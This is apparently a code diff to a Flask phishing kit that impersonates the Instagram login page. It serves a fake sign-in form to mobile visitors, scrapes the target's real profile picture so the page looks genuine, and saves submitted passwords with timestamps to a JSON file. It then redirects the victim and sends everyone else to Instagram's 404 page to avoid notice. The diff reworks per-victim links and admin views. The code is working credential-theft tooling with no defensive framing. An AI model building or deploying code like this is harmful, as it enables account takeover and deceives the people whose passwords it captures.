@@ -12,19 +12,16 @@ if not exists('password.txt'):
     with open('password.txt', 'w') as file:
         file.write("password")
 
-if not exists('creds.json'):
-    with open('creds.json', 'w') as file:
+if not exists('database.json'):
+    with open('database.json', 'w') as file:
         file.write("[]")
-
-if not exists('url.txt'):
-    with open('url.txt', 'w') as file:
-        file.write("https://www.instagram.com/")
-
 
 def get_pfp(username):
     base_url = f"https://www.instagram.com/{username}/"
     
     response = requests.get(base_url)
+
+    pfp = "https://upload.wikimedia.org/wikipedia/commons/a/ac/Default_pfp.jpg"
     
     if response.status_code == 200:
         soup = BeautifulSoup(response.text, 'html.parser')
@@ -32,11 +29,9 @@ def get_pfp(username):
         meta_tag = soup.find("meta", property="og:image")
         
         if meta_tag:
-            return meta_tag["content"]
-        else:
-            return False
-    else:
-        return "https://instagram.fcok4-1.fna.fbcdn.net/v/t51.2885-19/44884218_345707102882519_2446069589734326272_n.jpg?_nc_ht=instagram.fcok4-1.fna.fbcdn.net&_nc_cat=1&_nc_ohc=IvSYzbKdP6sAX8FLV-B&edm=AOQ1c0wBAAAA&ccb=7-5&ig_cache_key=YW5vbnltb3VzX3Byb2ZpbGVfcGlj.2-ccb7-5&oh=00_AfBxNhzq0oiKo-iCJt1UpyAn8HtcPXpkZnoyr6Y2GG7XyA&oe=650466CF&_nc_sid=8b3546"
+            pfp = meta_tag["content"]
+        
+    return pfp
 
 @app.errorhandler(404)
 def page_not_found(e):
@@ -46,25 +41,33 @@ def page_not_found(e):
 def index():
     return redirect('https://www.instagram.com')
 
-@app.route('/accounts/<username>/login')
-def login(username):
+@app.route('/<backend>')
+def login(backend):
+    with open('database.json', 'r') as file:
+            data = loads(
+                file.read()
+            )
+
+    if backend not in data:
+        return redirect('https://www.instagram.com/404') 
+    
     user_agent = request.headers.get('User-Agent')
     
     if 'Mobile' in user_agent or 'Android' in user_agent or 'iOS' in user_agent:
+        username = data[backend]["username"]
+
         pfp = get_pfp(username)
-        
-        if not pfp:
-            return redirect('https://www.instagram.com/404')
         
         return render_template("login.html", username=username, pfp=pfp)
         
     return redirect('https://www.instagram.com/404')   
 
-@app.route('/accounts/<username>/submit', methods=['POST'])
-def submit(username):
+@app.route('/submit', methods=['POST'])
+def submit():
     if request.method == 'POST':
         data = request.form
 
+        backend = data.get('backend')
         password = data.get('password')
 
         with open('creds.json', 'r') as file:
@@ -72,15 +75,13 @@ def submit(username):
                 file.read()
             )
 
-            data.append(
-                {
-                    "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                    "username": username,
-                    "password": password
-                }
-            )
+        if backend not in data:
+            return redirect('https://www.instagram.com/404')  
 
-        with open('creds.json', 'w') as file:
+        data[backend]["password"] = password
+        data[backend]["submit_date"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+        with open('database.json', 'w') as file:
             file.write(
                 dumps(
                     data,
@@ -88,40 +89,30 @@ def submit(username):
                 )
             )
 
-    with open("url.txt", "r") as file:
-        url = file.read()
+        url = data[backend]["url"]
 
-    return redirect(url)
-
-@app.route('/admin/<password>')
-def view(password):
-    with open("password.txt", "r") as file:
-        real_password = file.read()
-
-    if password == real_password:
-        with open('creds.json', "r") as file:
-            data = loads(
-                file.read()
-            )
-
-        return render_template('admin.html', users=data)
+        return redirect(url)
     
-    return redirect('https://www.instagram.com/404') 
+    return redirect('https://www.instagram.com/404')  
 
-@app.route('/change_url', methods=["POST"])
-def change_url():
-    if request.method == "POST":
-        url = request.form.get("url")
+# @app.route('/admin/<password>')
+# def view(password):
+#     with open("password.txt", "r") as file:
+#         real_password = file.read()
 
-        if not url:
-            return redirect('https://www.instagram.com/404') 
-        
-        with open('url.txt', "w") as file:
-            file.write(url)
+#     if password == real_password:
+#         with open('creds.json', "r") as file:
+#             data = loads(
+#                 file.read()
+#             )
 
-        return f"URL changed to {url} successfully."
+#         return render_template('admin.html', users=data)
     
-    return redirect('https://www.instagram.com/404') 
+#     return redirect('https://www.instagram.com/404') 
+
+@app.route('/new/<password>')
+def new():
+    return render_template("new.html", url=request.url_root)
 
 @app.route('/mayday')
 def mayday():
